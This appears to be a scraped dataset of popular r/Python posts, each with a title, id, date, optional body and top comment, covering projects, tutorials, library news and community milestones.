I have always taught kids in my room but I started teaching an AP Computer Science course in java virtually two years ago. This was all fine and good but I got interested in providing my own a-synchronous resources for my students to make learning virtually more accessible. Fast forward a year and we've convinced my district that if I can make video series for students to learn introduction programming then it will help non-trained teachers offer these courses to students at smaller rural schools where there are less course offerings.

That triggered me getting to produce my Arduino course. Then this year, expedited by the pandemic and the need for virtual resources, I got to build my Python course. Next up is building a full Java course that hits on everything in the AP Computer Science A curriculum.

I know there's a million resources out there and I was doing it for my district and my students, but I figured if I'm going to be doing it anyway, I might as well share it with a broader audience. So, with permission, I ""branded"" the content and published it all on YouTube.

Anyway, from one CS teacher to a bunch of humans trying to learn how to code: I hope it's helpful.

Link to YT Channel: [https://www.youtube.com/c/CodeWithConner](https://www.youtube.com/c/CodeWithConner)

Link to my site: [https://www.codewithconner.ca/](https://www.codewithconner.ca/)

Happy Tuesday, may your BTC/GME go to the moon (if that's your thing) :)","This is great! I wish I had a teacher like you when I was
younger!"
"Pyxel, a retro game engine for Python, reaches 300,000 downloads!",ybf948,2022-10-23 19:25:30," Thanks to all of you, downloads of Pyxel, a retro game engine for Python, have reached 300,000!

Pyxel is a game engine that is free, comes with tools, and can run in a web browser.

Installation and usage instructions can be found on the GitHub site: [https://github.com/kitao/pyxel](https://github.com/kitao/pyxel)

Since it supports web browsers, games and tools created with Pyxel can be tried out immediately without prior preparation.

For example, here is a platformer that comes as a sample (Be warned, it's difficult!): [https://kitao.github.io/pyxel/wasm/examples/10\_platformer.html](https://kitao.github.io/pyxel/wasm/examples/10_platformer.html)

This is a game created by users (which is also difficult!): [https://kitao.github.io/pyxel/wasm/examples/megaball.html](https://kitao.github.io/pyxel/wasm/examples/megaball.html)

You can also try the included image/sound editing tools in your browser: [https://kitao.github.io/pyxel/wasm/examples/image\_editor.html](https://kitao.github.io/pyxel/wasm/examples/image_editor.html) [https://kitao.github.io/pyxel/wasm/examples/sound\_editor.html](https://kitao.github.io/pyxel/wasm/examples/sound_editor.html)

Since Pyxel can be used as a Python module, it can be combined with other AI libraries. Hopefully, your ideas will continue to create interesting applications in the future!","This is way better than no comments or votes in an hour.

Thanks"
EVERY. TIME.,ajrkh7,2019-01-26 01:49:27,,Just use Ctrl-D ;)
What a surprise: had some Python swag in the mail today!,7pid7p,2018-01-11 04:16:58,,"I got lucky at the 2017 Python Developers Survey that the Python Software Foundation and Jet Brains did.

The package included a Python T-Shirt, some stickers, a notebook, a pencil and a fidget spinner with Python logo.
Jet Brains put in a very nice notebook.

Now I have to find a nice place on my laptop for another Python sticker :)

If anyone from the organizers reads this: thank you very much, this is super! "
Pygame 3D Graphics,kfq7iw,2020-12-19 02:04:43,"i made a DOOM style engine in pygame

https://reddit.com/link/kfq7iw/video/ac31q76ljz561/player",conclusion: Python Runs Doom
"He wasn’t happy about it, but Guido did take a picture with me",bk287v,2019-05-03 08:26:53,,Your dads cool with you referring to him by his first name?
Pandas got a new logo,dnrp3b,2019-10-27 18:44:52,,Wow dont even remember the previous one. I’ve seen it so many times but dont remember
The Ultimate Python Resource hub - Curated list of useful resources for all Python beginners,jc5xkf,2020-10-16 16:06:44,,"The entire problem with resource lists like this, especially ones that target beginners is that they overwhelm them with choices and the paradox of choice kicks in. In the end you don't end up achieving anything. Just my two cents though"
"I save all of my music on YouTube playlists and was really anoyed by all of the downloaders on the internet(Full of ads, not reliable...). So I've created a simple YouTube playlist downloader, it loads up all of the songs from the playlist and then downloads one by one in a MP4 format.",g5gqg0,2020-04-21 22:58:19,,"No offense but if you won't maintain it regularly you can throw it in a bin after 2-4 weeks.

Youtube-dl is probably still the better choice but it's a nice play around to learn about that subject."
Linear Regression using Gradient Descent (3 types),gns9rb,2020-05-21 15:23:19,,"Link to GitHub: [code](https://github.com/Gautam-J/Machine-Learning/tree/master/GradientDescent_LR) 

* Batch Gradient Descent looks at all training examples at every iteration.
* Stochastic Gradient Descent looks at a single training example (chosen randomly) at every iteration. Once it has seen all training examples, one epoch is over. This was trained for 10 epochs.
* Mini Batch Gradient Descent looks at a batch of training examples (in this case, 32) at every iteration."
A REAL Python cheat sheet for beginners,8w5ra9,2018-07-05 06:56:12,,"    a = [1, 2, 3, 4]  # Point a at a new list, [1, 2, 3, 4]
    b = a             # Point b at what a is pointing to
    b is a            # => True, a and b refer to the same object
    b == a            # => True, a's and b's objects are equal
    b = [1, 2, 3, 4]  # Point b at a new list, [1, 2, 3, 4]
    b is a            # => False, a and b do not refer to the same object
    b == a            # => True, a's and b's objects are equal

Never seen this explained so clearly. I love it."
Tensorflow Object Detection in 5 Hours with Python | Full Course with 3 Projects,n5aksy,2021-05-05 15:56:07,,Ah damn... how am I supposed to get any actual work done for the last 5 hours of this workday
"Alien invasion game developed using Python. Reference : Python Crash Course, 2nd Edition: A Hands-On, Project-Based Introduction to Programming",c2w6hc,2019-06-20 21:43:06,,Nice. How much time did it take you to finish this project? I am learning from codeacademy and Automate boring stuff.
Python has made my job boring,oylicw,2021-08-06 00:04:40,"# I'm going to just go out and say it...Python has made my job boring.  I am an engineer and do design and test work.  A lot of the work involves analyzing test data, looking at trends over temperature etc.  Before python (BP) this used to be a tedious time consuming tasks that would take weeks.  After python (AP), I can do the same tasks few lines of code in a matter of minutes, I can generate a full report of results (it takes other engineers literally days to weeks to generate the same sort of reports).  Obviously it took me a while to build up the libraries and stuff...I truly enjoy coding in python and not complaining...  Just wondering if other people are having the same experience.",#BIG LETTERS
Here we go,apndyq,2019-02-12 08:55:22,,The one on the left is very focused on memorization. I don't think that's a good way to learn to programme. The one on the right is legit. **The one in the middle is awesome**. Start with it.
I've made a sorting visualizer with python and matplotlib.,f5vmh6,2020-02-19 01:47:36,,whats going on with the odd red blobs at the end of quicksort?
"For anyone learning Python for data science, this an amazing resource--excellent book as free Jupyter notebooks",5qflfv,2017-01-27 14:10:21,,"Hey all, that's my book!

I'm happy to answer any questions if you have them"
Python module for Nudity Detection and Classification.,i8ceq4,2020-08-12 19:58:16,,Hot Dog. Not Hot Dog. 🌭
Drawing Replicator using Fourier Transform and Epicycles,c9f3ua,2019-07-05 19:55:51,,After watching [this video](https://www.youtube.com/watch?v=r6sGWTCMz2k) by 3blue1brown i decided to write a small script to replicate hand drawn shapes ([gitlab repo](https://gitlab.com/giacomogallina/fourier))
"Intel Publishes Blazing Fast AVX-512 Sorting Library, Numpy Switching To It For 10~17x Faster Sorts",113cb77,2023-02-16 07:48:51,,"Intel: Look at this cool new library that benefits a ton from AVX-512!

Also Intel: Hey we removed AVX-512 from consumer CPUs

AMD: Hey we just added AVX-512 to consumer CPUs

Intel: *Shocked pikachu face*"
Transfer of Power (Guido stepping down as BDFL),8yapie,2018-07-12 23:24:04,,"I've followed python for around 20 years now. It hasn't been consistently my main language, but I've always had a tremendous respect for both the language and the excellent community of developers built around it.

I hope that everyone realizes what a tremendous boon has been the gentle and wise guidance of Guido at the helm. The language has developed artfully and productively, and the community has both grown and kept it's character. There are very few open source projects with processes as excellent or product as clean and useful. The style of python is a product of Guido's aesthetic sense and his ability to communicate straightforwardly, knowledgeably, and artfully, with a large and diverse community.

Guido has done an excellent job. I appreciate his work deeply. I hope and expect that others will pick up where he left off. I also hope and expect that the culture he had a big hand in developing is maintained and cherished. Python is one of the great open source projects and we owe a lot of that to Guido.

Thank you, Guido. Thank you."
[Code Release] We created a fully autonomous YouTube channel that uploads daily self-created Twitch gaming compilations. It was a 100-day experiment that is now over. We spend many hours documenting everything and are sharing our four repositories with this post. Enjoy!,msskzd,2021-04-17 23:17:10,"More information can be found in the README of each repository. Please make sure to give the project a star on GitHub if it is helpful to you in some way. Thanks!  


[https://github.com/ContentAutomation](https://github.com/ContentAutomation)","You said you can't monetise videos because of copyright etc. That's understandable. Perhaps make it into a service product that allows a streamer to feed it a full 6 hour stream VOD and it'll auto create a clip montage? You could potentially find yourself being acquired by twitch if it's good.

Edit: forgot to mention this is still an absolutely amazing project and it's very well done"
Python turns 30 this month😎,lhm3pm,2021-02-11 22:44:28," Python was **created** by Guido van Rossum, and first released on February 20, 1991.",What was the first version like?
I made a PlayStation 5 Bot,jz0l14,2020-11-23 02:26:34,"After trying to get a PlayStation 5 for quite awhile, it seems impossible to buy one as scalpers are using bots to mass purchase them and then resell them at huge up charge. After being really irritated about this, I decided to create my own bot, which I’ll be releasing for free. No longer will scalpers get a huge advantage over everyday people. It’s time to fight fire with fire. The link below points at my GitHub which has the public repository and an easy way to install it on your computer. I’ll give more instructions on it later if there’s any confusion. HAPPY SHOPPING!!!!

[PlayStation Bot Repo](https://github.com/dkkocab/WebSiteBot_PS5)","There is a package called webdriver manager that doesn’t need a hard coded path: https://pypi.org/project/webdriver-manager/


Try that. It’s extremely helpful and you don’t need care about paths for the driver again."
"I made a Python library for advanced Google News data mining: get news data by topics, geolocation, full-text search. Plus, clusters of similar topics",hjatkm,2020-07-01 22:05:35,,GitHub: [https://github.com/kotartemiy/pygooglenews](https://github.com/kotartemiy/pygooglenews)
Layers on layers on layers,csb8z5,2019-08-19 11:03:15,,Huh. TIL there is a python interface to Processing.
NumPy announces timeline for dropping Python 2 support,7d128x,2017-11-15 10:49:55,,"Well this gives me a lot of motivation to finish our transition to python 3 in my company. It's been a slow process but one I plan to finish by about February of next year.

Before anyone passes judgement, I'm the only person who has been converting code for about 100,000 lines of code or so, while still producing new features. I've been working towards it for about 2 years now, off and on. I'm in the final push now. If anyone has any tips I'd by happy to receive them. "
effbot has passed away.,rdhqyd,2021-12-11 04:26:21,,"For those that don't know him, Fredrik Lundh (aka effbot) was a fantastic early contributor to Python.  Early in Python's history, a few contributor, including timbot (Tim Peters) and martellibot (Alex Martelli), were given bot nicknames as people had trouble to believe that mere humans could provide so quickly so many helpful and well thought of replies to questions on comp.lang.python."
They use python to produce black hole image,bbrhr4,2019-04-11 05:16:07,"3 years ago MIT grad student Katie Bouman led the creation of a new algorithm to produce the first-ever image of a black hole.

Today, that image was released.

https://twitter.com/SmithsonianChan/status/1115970184659910656

TED - Katie Bouman: How to take a picture of a black hole

https://www.youtube.com/watch?v=BIvezCVcsYs

software used python

https://github.com/achael/eht-imaging","So instead of the usual

    import antigravity

they had to do an

    import gravity

?"
The apocalypse,92zezn,2018-07-30 08:21:19,,"out of loop, what happens in 2020?"
I created this website to visualize how emojis are used on Twitter. Is the 14/4/2016 peak related with Python? Link in comments,e2xi4l,2019-11-28 20:40:05,,"Possibly because of Kobe Bryant's last game that was played on April 13, 2016. Most points scored in a last game played. He goes by the nickname Black Mamba."
I [13 yo] made a folder automating script in python!!,kmf1x6,2020-12-29 22:07:02,"I have made this

[https://github.com/P-arag/folder-automation](https://github.com/P-arag/folder-automation)

script that scans your downloads folder and transfers the files in their respective folders, for example, if you download a cat.jpeg, it is instantly gonna transfer it to Pictures folder. Currently, it **works only in Linux**, but it should be pretty adaptable to mac and PC. It works **really well** and autonomously when I added it to the startup applications of Ubuntu","That's pretty good! Some ideas to improve it:

* `import pathlib`: you don't need to fudge around with manually inserting `'/'` between strings, or `fileName.split('.')` (which becomes a problem with files with more than one 1 extension like `.tar.gz` files or files that have no extension at all). It would also help you fix the bug where `.doc` files are placed in `Code` because they end in `'c'`.
* You move every file twice. The first time you simply add a number to prevent duplicates. The second time you do it by a `cp` followed by a `rm`. This causes problems if your filename contains a space. You could solve both of these at once by doing `import shutil` and using `shutil.move`.
* There is a lot of code duplication. How could you make `Handler.on_any_event` smaller?

All in all, your code is put together very nicely, much better than I could do at your age!"
I made this figure in python as a masters student and it's still my favorite,b8buj2,2019-04-02 08:24:12,,I can tell a graduate degree was involved because I have no idea what I'm looking at.
My first own program. Beginner,d7ma3q,2019-09-22 13:29:10,,"Try to not use magic numbers. You already set password to 1234, but then you wrote 1234 three times without using it.

What happens if you put in the right password on the first try? ;)

Another tip would be to rearrange the logic in the while loop to have all ""wrong password"" logic in one place and all ""correct password"" logic in another"
You can hire Guido as a tutor,3p12ww,2015-10-17 03:44:30,,@BillGates can you help me make my text cursive in Word?
Made use of my Python knowledge professionally for the first time!,am0opt,2019-02-01 18:23:37,"I’m a mechanical engineer, but love learning new things. In the last few years, I’ve taken several edX courses on python, and loved learning about it. I generally just tinker around keeping the basics fresh, but recently I had an opportunity to speed up some data analysis at work, and was able to use python to do it!

As part of our testing, we generate some large csv files (generally 1-4 gb), which were a real pain in the ass to work with in excel. Using python and pandas, I wrote a short piece of code (200 lines) to parse our data, strip out the junk, and plot it into a presentable form. Now there are like 5 people using it on a regular basis!

This is a big deal for me so I wanted to share it. Even dumb mech e’s can use computers!

E: Wow! Thanks for the overwhelming support guys! Every single comment I saw was very positive and helpful, you all are awesome. ",My sincere congratulations. This is only the beginning.
10 Tools I Wish I Knew When I Started Working with Python,srcg8m,2022-02-13 14:49:19,"An article with funny memes that explains tools like venvs, flake8, black, isort, pytest, commitizen, semantic-release, pre-commit hooks, and Github Actions and how they work together

[https://python.plainenglish.io/10-tools-to-help-claw-your-way-back-to-sanity-while-coding-python-df0af160c33e](https://python.plainenglish.io/10-tools-to-help-claw-your-way-back-to-sanity-while-coding-python-df0af160c33e)","What the article absolutely misses is py-spy for performance profiling 

https://github.com/benfred/py-spy"
I wrote another Binance trading algo in Python. This one is able to analyse how volatile every coin on Binance is and place a trade when during a strong bullish movement,n9smh1,2021-05-11 16:59:04,"Had a lot of fun with with one, and I'm happy to share the code with you guys.

So the algorithm is essentially listening to price changes in the last 5 minutes for all the coins on Binance. Once it detects that some coins have moved by more than 3% in the last 5 minutes, it takes this as a strong bullish signal and places a trade.

The algo is also able to store each bought coin in a local file and to track the performance of each trade placed so that it can perform stop loss and take profit actions and sell the coins that reach those thresholds.

Here's a more in-depth look at the bot parameters:

1. By default we’re only picking USDT pairs
2. We’re excluding Margin (like BTCDOWNUSDT) and Fiat pairs
3. The bot checks if the any coin has gone up by more than 3% in the last 5 minutes
4. The bot will buy 100 USDT of the most volatile coins on Binance
5. The bot will sell at 6% profit or 3% stop loss

Anyway, here's the source code if you're comfortable with Python:

[https://github.com/CyberPunkMetalHead/Binance-volatility-trading-bot](https://github.com/CyberPunkMetalHead/Binance-volatility-trading-bot)

In case you need more guidance but would like to try the bot out, I wrote step-by-step guide as well

[https://www.cryptomaton.org/2021/05/08/how-to-code-a-binance-trading-bot-that-detects-the-most-volatile-coins-on-binance/](https://www.cryptomaton.org/2021/05/08/how-to-code-a-binance-trading-bot-that-detects-the-most-volatile-coins-on-binance/)

Any feedback or ideas how to improve it are welcome! :)","Post this on r/cryptocurrency and earn yourself some moons
E: typo"
snakeware - a new Linux Distro with a fully Python userspace,gstn6b,2020-05-29 22:07:44,"snakeware is a new Linux-based operating system with a fully Python userspace. Our window manager is based on pygame\_gui. We do not use X11, we draw directly to the framebuffer. We also do not use systemd or any of the other huge and typical GNU/Linux utilities, because they are very opaque and not fun for recreational programmers to contribute to.

Our distro boots directly into a Python environment, where you can then do whatever you want with your computer. It's being designed based on the spirit of the Commodore 64, which is primarily that computing should be simple and fun. snakeware is still early in development, but we would like to welcome more contributors as the project grows (both in the Python space and in the build/packaging process for the actual distro).

snakeware GitHub:  [https://github.com/joshiemoore/snakeware](https://github.com/joshiemoore/snakeware)

YouTube Demo:  [https://www.youtube.com/watch?v=Zy8NXuzBPhA](https://www.youtube.com/watch?v=Zy8NXuzBPhA)

Thanks for reading, I'd love to hear what you think!

edit - added a screenshot

https://preview.redd.it/bxqsh4lkop151.png?width=801&format=png&auto=webp&s=b31455342250cd6f7d7f071370498d57cec1f728","""why?""

""..because it's fun""

lol this is cool :)"
I wrote a script to display an image in terminal using ANSI codes,964qci,2018-08-10 15:06:33,,"Bonus of me using it to render my usb camera: https://gfycat.com/RemarkablePalatableKob

Code is here: https://github.com/JonnoFTW/img_term"
I scanned every package on PyPi and found 57 live AWS keys,10525zo,2023-01-07 02:53:40,,"I have accidently pushed discord api keys to github like a dozen times, and every time, I immediately get an email for discord saying "" hey idiot, you goofed. Go get new keys"".

Always makes me laugh when I see that email. Thankfully I haven't done that in a while"
A modern and customizable python UI-library based on Tkinter,uznn8f,2022-05-28 21:44:47,,"Wow, this looks really good! As far as I remember (haven't used Tkinter in a looong time), plain Tkinter GUI looks kinda meh, but this is somewhat stylish even"
This advert for a java course uses an image of python code.,9zkfk8,2018-11-23 10:52:25,,Just another one of the 3 billion devices running java.
SMS Spoofing with Python for Good and Evil,6dtp3d,2017-05-28 21:07:32,,"I did it in Israel, with an Israeli sms provider that gave me the option to use any number as the from_number. 

I sent to my brother ""you are adopted.""
from my mom's number, he thought it was funny, my mom didn't.

Anyway, someone has a place that I can sleep tonight?"
Python script that helps you study almost any language for FREE,k3tmw9,2020-11-30 18:50:05,"Hello everyone.

I wrote a python script that can help anyone who wants to study a foreign language to get full language courses for various levels for FREE.

The script is a scraper I wrote since I wanted to save some courses and material from Japanesepod101 to listen to on my phone, but I ended up making it global for almost any language.

Few points regarding the script:

1. I've noticed there are some other similar scrapers that rely on selenium but they are buggy and fragile. I like selenium as a tool, but I find it often times unnecessarily misused when simple POST/GET requests could get the same job done more eloquently, that's why I went with beautifulSoup.
2. Currently the script is only downloading mp3s (since that's what I originally intended to do) but I  plan on adding PDF/Video downloading in the future as well.

Any feedback is appreciated! :)

[https://github.com/nedlir/languagepod101-scraper](https://github.com/nedlir/languagepod101-scraper)","Now is there a way for that thing to help me learn python? Lol I mean, it’s a language too? :P"
A Python program that lets you set the Windows desktop wallpaper to a video!,dzptly,2019-11-22 04:57:08,,Looks like a huge duty for GPU and CPU
"Complete Python Course (~5 Hours, Free)",lyg74t,2021-03-06 00:55:15,"Hi there **👋**

I created a [complete Python course](https://youtu.be/t8pPdKYpowI), which I think could be interesting for some of you! 😊

&#x200B;

The topics I cover in the course:

# 📚 OVERVIEW 📚

* Introduction to Python
* Installation and Setup Local Development Environment
* Write our first Python program
* Python IDE vs simple File Editor
* Strings and Number Data Types
* Variables
* Encapsulate Logic with Functions
* Accepting User Input
* Conditionals (if / else) and Boolean Data Type
* Error Handling with Try / Except
* While Loops
* Lists and For Loops
* Comments in Python
* Sets
* Built-In Functions
* Dictionary Data Type
* Modularize your project with Modules
* Project: Countdown App
* Packages, PyPI and pip
* Project: Automation with Python (Working with Spreadsheets)
* Object Oriented Programming: Classes and Objects
* Project: API Request to GitLab

&#x200B;

Appreciate any feedback and hope the content is valuable for some of you 😊",Thanks! Watching now :)
I wrote my first real scripts today,xlgo4a,2022-09-23 07:18:40,"I’m a water resource engineer by trade, learning to code partially for fun and partially in the hopes of making my job easier. Today I needed to convert a whole bunch of files from one format to another, edit some particular values in the header, and convert to a third format. Rather than spend all day doing it by hand, I spent all day writing a script that does it in seconds…and it works!

It’s a piddling little script, only about 50 lines, but it does exactly what I want it to do, and now in the future when I have to deal with this process again, I’ll be armed and ready. 

I know this is nothing revolutionary, but honestly it feels pretty good to write working code to address a real life problem! Hopefully the next one goes a bit faster…",The best part is if you realize tomorrow you did something slightly wrong you can tweak your script and fix it in seconds.
Facial Detection with python in just 2 mims [tutorial],ilp6py,2020-09-03 15:48:42,,"I'm super new at python and coding (like 4 weeks lol) but stuff like this is so exciting, especially as I'm almost starting to understand parts of it. Thank you for sharing."
A* path finding algorithm visualizer written in pygame - https://github.com/mHaisham/Steruell,eo3pzd,2020-01-13 20:52:28,,"Great work. On the very bottom of the path, wouldn't it be shorter to cut straight across than to go along the edge of the wall? Sorry if I'm missing something obvious. Also, why does it sometimes go diagonally but sometimes take 2 steps to go diagonal?"
You can now make Python desktop apps with HTML and CSS?,rofw96,2021-12-26 03:35:28,"Yup you read that right. A project named Neutron ([https://github.com/IanTerzo/Neutron](https://github.com/IanTerzo/Neutron)) now gives the ability to create desktop apps with HTML and CSS. The workflow is very similar to how it is building a website, except that you use python instead of JavaScript, and that you build an app. And it's all native. The window is actually a browser, similar to how Electron does it. The best part is that you have full access to the DOM as you would in JavaScript, with basically no latency. The only problem right now is that it takes 2 - 4 seconds to fully load an app, but this is resolved by implementing a loading window. Similar to how Discord does it, which is also built on Electron btw.

    import Neutron
    
    win = Neutron.Window(""Example"", size=(600,100), css=""def.css"")
    win.display(file=""render.html"")
    
    def onClick():
      win.getElementById(""title"").innerHTML = ""Hello:"" + win.getElementById(""inputName"").value
    
    win.getElementById(""submitName"").AddEventListener(""click"", Neutron.event(onClick))
    
    
    win.show()

From [main.py](https://github.com/IanTerzo/Neutron/blob/main/TEMPLATE/main.py) in Neutron's GitHub.","> And it's all native.

What does this even mean in this context? Maybe I'm wrong, but I always thought native applications meant they use the widgets and UI of the OS it's running on."
I made a little script to download playlist from Spotify,khajql,2020-12-21 13:01:14,"Hey guys, I made this little script that takes any Spotify playlist, list all the tracks, search each of them on YouTube and download them in mp3. About 2 years ago I used a tool to do that, but apparently it was deleted, and the other alternatives out there you need to pay to use it so I made my own. Hope it can be useful for someone.

Link: [https://github.com/norbeyandresg/hades](https://github.com/norbeyandresg/hades)

Edit: thanks you all for the incredible support, I’ll checking the little issues and make some improvements to the script. 

For the interested, I’m currently paying and using Spotify premium though :)",Was thinking of making one of these myself. Now I don't have to! Thanks stranger!
Is there possible interest in a youtube series on building a python desktop program?,veklmy,2022-06-18 00:57:08,"I am interested in doing a youtube series on python.  I know there are already a lot of talented youtubers covering learning python.  I want to show how to create a python desktop application from the ground up.  It will cover specifics, not generalities and share all source code.  Here are some of the topics I plan to cover.

* focusing on Windows development, but most will port readily to linux and mac
* installing python
* sublime text editor, customizing and integrating for python
* automation scripts to aid running and building python integrated into sublime
* using pyinstaller to build executable, so you can distribute code without python
* Qt5 for building a GUI for you desktop app and using QtDesigner
* Integrating SQL database into your application (SQLite)
* my source code search for code reuse
* the target program will be a wristwatch database for my watch collection
* I will be sharing all source code
* specifics, not generalities

This will not be a ""learn how to program"" series.  The focus will be on demonstrating steps needed to build such an application.  Repurposing this watch database for your own database application would be straight forward.

Note:  There's more than one way to skin a cat .  I will simply be showing how I do it and it may or may not be the best way for you.

Any feedback regarding my plan is greatly appreciated.",I’d watch it because really all I know how to do is write some scripts that I k ow how to manipulate myself. Making something with a gui that is more user friendly would be of interest to me
Datasette Desktop 0.2.0: The annotated release notes,pnzh50,2021-09-14 17:35:40,,"tl;dr:

* Datasette is an “open source multi-tool for exploring and publishing data” built on top of SQLite (and Python).
* Datasette Desktop is a new macOS desktop application version of Datasette."
"AI Cheatsheets - Now learn Tensorflow, Keras, Pytorch, Dask, Pandas, Numpy, Scipy, Pyspark, R Studio, Matplotlib and many more in an interactive manner",cyslju,2019-09-03 02:06:06,,Looks like a great website. Thanks for sharing!
Comprehensive Python Cheatsheet,zvjfdy,2022-12-26 17:16:39,,"See also:

* [Python Crash Course cheatsheet](https://ehmatthes.github.io/pcc_2e/cheat_sheets/cheat_sheets/)
* [learnxinyminutes post for Python](https://learnxinyminutes.com/docs/python3/) — cheatsheet with explanations
* [Scientific Python cheatsheet](https://ipgp.github.io/scientific_python_cheat_sheet/)
* [Python regular expression cheatsheet](https://learnbyexample.github.io/python-regex-cheatsheet/) — my blog post, includes examples as well"
A List of 100+ Random Python (beginner and advanced) Project Ideas,j5731h,2020-10-05 05:35:10,"Hey guys!

I know it's currently quarantine for most people, recruiting season for students/graduates, but also just a good time to keep up with coding and learning new things. I love projects because I think they're the best way to apply what you've learned and also create something relevant and functional to you. But we know that sometimes it's hard to get come up with ideas or it's just better to start small. Check out this list of more than a 100 Python projects that I compiled on topics such as web development, AI/ML, data science etc. to get inspired and start building!

[https://blog.thecodex.me/100-python-and-data-science-projects-for-every-kind-of-programmer/](https://blog.thecodex.me/100-python-and-data-science-projects-for-every-kind-of-programmer/)

A preview of ideas:

1. Mad Libs Creator
2. Sports Scores Tracker using Web Scraping
3. Random Password Generator
4. Mock Instagram Image Gallery
5.  Recipe (or anything else!) Database/ Manager
6. Movie/TV Show/Music/Book Recommenders with K-Means Clustering
7. Face Detection using Optical Character Recognition
8. Sentiment Analysis of Customer Feedback/Reviews
9. Image Caption Generator using CNN
10. Product Prices Estimates with ML
11. Nutrition/Fitness Tracker

P.S. If you do end up making one of these projects, let us know what you build and send a picture! We'll feature you on our project/coding tutorial Twitter account!

Thanks,

Avi","i don't know if you are the writer but a recommendation to make the blog a lil more appealing, maybe divide each project into a beginner/intermediate/advanced categories"
Got some free time this weekend and want to build your Python and machine learning skills? Here's how to train your own object detector using Google's Python-based TensorFlow framework.,7zpn7y,2018-02-24 01:14:14,,"Ok, recognizing the cards is nice... but how about teaching it to count them and help you win at blackjack? :-)"
An attempt to significantly reduce homelessness and poverty: I made an open source web application that helps people who are struggling find social services and donators in their area that will help them.,zknjik,2022-12-13 13:30:59,"Link: https://stdepaul.org

It's called St. Vincent de Paul Assistance Center (named after St. De Paul because he is known for having dedicated his life to helping the poor). I had the idea for the project when I was trying to think of ways that web infrastructure can help cities build physical infrastructure. I started to think more broadly, and thought about how so many people in my community are struggling, and could be helped if they knew about social services in their area. I decided that St. De Paul can be a solution to this problem and other problems: to reduce homelessness, and to reduce poverty.

It is very much location-based, like craigslist (though people can get help from outside of their communities). Currently in the works: messaging, following, reviews, commenting. I just wanted to share the MVP so that people know St. De Paul is ready to help ASAP. (I had the idea for St. De Paul a week ago, and have been working on it ever since. I know it's a very quick MVP -- I'm using some code from some of my older personal projects.) I'm still debugging though, so you may run into some bugs.

Also, be prepared to wait for your post/wiki entry/helper org to be approved. I don't want people submitting inappropriate, or worse, illegal content, and then that be public on St. De Paul. I am posting this as I am about to fall asleep, so you likely won't see your posts in the search results until tomorrow, when I'll be able to approve your posts (but the links to whatever you create will be public, unless you delete it).

At the moment, only Dallas has wiki info on social services in the area (edit: there is now data for Texas, CA, and PA). The idea is that people can register and add information to the wiki for their area (categories: social services, free education that helps people develop skills for a better job (with testimonials), scholarships, etc). They get points for this, and there will be a ""Top Contributors in Your Area"" page that will encourage people to add information. People / organizations also get points for donating or providing services to people in their area (they also get points for donating or providing services outside of their area, but this gives fewer points). 100% of donations and services to people struggling go directly to those people. We will also be helping people apply for social services online, similar to TurboTax, so they won't have to worry about snail mail.

At the moment I'm looking for a corporate lawyer to help incorporate and to help with legal in general, as well as 

   1) empathetic and compassionate people who are great at running non-profits, and 

   2) a django developer more senior than me, to add to the board of directors at incorporation. I'm not sure how I'd handle donations directly to St. De Paul, except obviously website costs, payroll, and research on how to best serve poor people. If you are interested or know someone interested, please reach out (with your resume and linkedin)! Thanks

As far as contributors and moderators go, I'm looking for contributors who can: 

   1) add edit history to the wiki,

   2) help in writing tests and documentation, 

   3) add tree structure to comments (comments are almost done),  

   4) a mobile app 

   5) ""Top Contributors in your area"" (if I don't get to this before you all do). If you are interested, join the discord: https://discord.gg/krEyds6Cp2 -- and follow St. De Paul on Instagram: https://instagram.com/stdepaul

Source code: https://github.com/stdepaul/stdepaul

Thanks!

Michael

Here is my linkedin: https://linkedin.com/in/mikejohnsonjr

P.S. I think the portion in which we help people develop skills for a better job will be great in general. Someone I know personally went from working $10/hr to making $60k/year in a few months after taking a Data Analytics bootcamp, learning Excel and SQL. There are other paths as well.","FYI, various states already have more robust versions of this service. For example, [PA 211](https://www.pa211.org/)."
"Inspired on the Washington post article about COVID19 contain curve, I wrote some code emulating it. Comments are welcome.",flu062,2020-03-20 20:12:40,,"Thought about adding 'gravity'? Places like bars, transit stations, etc. where higher rates of contact can occur? I'm not sure how much it would affect the overall rate of spread but hotspots appear from time to time."
"First upload here, graphic of a path finding algorithm using pygame. Been coding for about 8 months now, thought I'd like to show it off. :)",bscau7,2019-05-24 11:52:04,,"This is really cool! Have you heard of the A* algorithm?

https://en.wikipedia.org/wiki/A*_search_algorithm"
Does anyone else dislike working with .ipynb files? Why can't I just define code cells with # %%,o52ldp,2021-06-22 02:58:36,"I do EDA in Python and often use Jupyter Notebooks so I can see graphs in line with my code, but I hate that I can't use it with plain .py files and have to use a .ipynb which doesn't work well with Git, other IDEs, refactoring, etc. Other IDEs like PyCharm, VS Code and Spyder all have the ability to define labelled code cells in .py file with a line comment starting with `# %%`.

VS Code can individually execute code cells defined with `# %%` from a .py file and show results in IPython which is exactly what I want.. but the problem is that results are shown in a separate window not right below the cell, and rerunning the cell shows a new figure in IPython instead of replacing it.

[VS Code IPython code cells](https://preview.redd.it/756eei2z2o671.png?width=2221&format=png&auto=webp&s=5bdc2bf83cff04883d1ede624292c8308476193b)

Is there any way I can get Jupyter to work for `# %%` code cells in .py files, or get one of the other IDEs to show and update code cell results like Jupyter does right below the cell?",Sounds like you're looking for [Jupytext](https://github.com/mwouts/jupytext) . It lets Jupyter work with plain .py files with cells delimited by `# %%`
Interactive Coronavirus Spreading Map in Python,eyigdc,2020-02-04 10:05:45,,"Easter egg idea: if the user drags it past the present, it adds a big cluster of dots right at the software's best guess of where the user is."
Tkinter for python 3.10 broken on MacOS?,q2rpmp,2021-10-07 03:33:57,"Hello, I read on the internet that there are some problems with Tkinter on laster MacOS updates like buttons invisible, UI bugs...Since I had some problems too recently, do you know anything about this situation?

EDIT : Solved! There is a package studied from Mac that extends tkinter and solves many problems.
Take a look at my GitHub’s issue, there are all steps to solve the problem and install the package( tkmacosx) :

https://github.com/Saadmairaj/tkmacosx/issues/33","Python versions above 3.6 are messed up for Mac afaik, at least you need some fix with the new Mac chip, you have to have the package run it via Rosetta or something? (I can't quite remember it's been months since I set up 3.9) so it could also be that


Newer versions of python always a bit less stable, so maybe try 3.9 or something"
